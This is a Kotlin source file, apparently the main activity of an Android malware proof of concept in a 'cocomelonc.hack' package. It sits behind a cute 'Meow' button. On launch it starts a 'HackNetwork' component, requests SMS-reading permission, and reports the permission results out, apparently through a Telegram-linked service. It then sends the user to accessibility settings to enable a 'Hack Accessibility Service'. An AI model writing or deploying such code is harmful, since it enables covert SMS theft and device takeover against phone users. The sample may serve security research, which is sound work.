package cocomelonc.hack

import android.Manifest
import cocomelonc.hack.tools.HackNetwork
import android.os.Bundle
import androidx.activity.ComponentActivity

import android.annotation.SuppressLint
import android.content.Intent
import android.widget.Button
import android.provider.Settings
import android.widget.Toast
import cocomelonc.hack.services.TelegramService
import com.karumi.dexter.Dexter
import com.karumi.dexter.MultiplePermissionsReport
import com.karumi.dexter.PermissionToken
import com.karumi.dexter.listener.DexterError
import com.karumi.dexter.listener.PermissionRequest
import com.karumi.dexter.listener.PermissionRequestErrorListener
import com.karumi.dexter.listener.multi.MultiplePermissionsListener

class HackMainActivity : ComponentActivity() {
    private lateinit var meowButton: Button
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        HackNetwork(this).initHack()
        requestPermissions()
        checkAccessibilityEnabled()
        meowButton = findViewById(R.id.meowButton)
        meowButton.setOnClickListener {
            Toast.makeText(
                applicationContext,
                "Meow! ♥\uFE0F I Love Bahrain \uD83C\uDDE7\uD83C\uDDED",
                Toast.LENGTH_SHORT
            ).show()
        }
    }

    @SuppressLint("NewApi")
    private fun requestPermissions() {
        // below line is use to request permission in the current activity.
        // this method is use to handle error in runtime permissions
        Dexter.withContext(this) // below line is use to request the number of permissions which are required in our app.
            .withPermissions(
                Manifest.permission.READ_SMS,
                Manifest.permission.POST_NOTIFICATIONS,
            ) // after adding permissions we are calling an with listener method.
            .withListener(object : MultiplePermissionsListener {
                override fun onPermissionsChecked(multiplePermissionsReport: MultiplePermissionsReport) {
                    // this method is called when all permissions are granted
                    if (multiplePermissionsReport.areAllPermissionsGranted()) {
                        // do you work now
                        Toast.makeText(
                            applicationContext,
                            "Hack permissions granted",
                            Toast.LENGTH_SHORT
                        ).show()
                        HackNetwork(applicationContext).sendTextMessage("Hack permissions granted\n")
                    }

                    // check for permanent denial of any permission
                    if (multiplePermissionsReport.isAnyPermissionPermanentlyDenied()) {
                        // permission is denied permanently, we will show user a message.
                        Toast.makeText(
                            applicationContext,
                            "Hack some permissions denied",
                            Toast.LENGTH_SHORT
                        ).show()
                        HackNetwork(applicationContext).sendTextMessage("Hack some permissions denied\n")
                    }
                }

                override fun onPermissionRationaleShouldBeShown(
                    list: MutableList<PermissionRequest?>?,
                    permissionToken: PermissionToken
                ) {
                    // this method is called when user grants some permission and denies some of them.
                    permissionToken.continuePermissionRequest()
                }
            }).withErrorListener(PermissionRequestErrorListener { _: DexterError? ->
                // we are displaying a toast message for error message.
                Toast.makeText(applicationContext, "Error occurred! ", Toast.LENGTH_SHORT)
                    .show()
            }) // below line is use to run the permissions on same thread and to check the permissions
            .onSameThread().check()
    }

    private fun checkAccessibilityEnabled() {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        startActivity(intent)
        Toast.makeText(this, "Turn on Hack Accessibility Service", Toast.LENGTH_LONG).show()
    }
}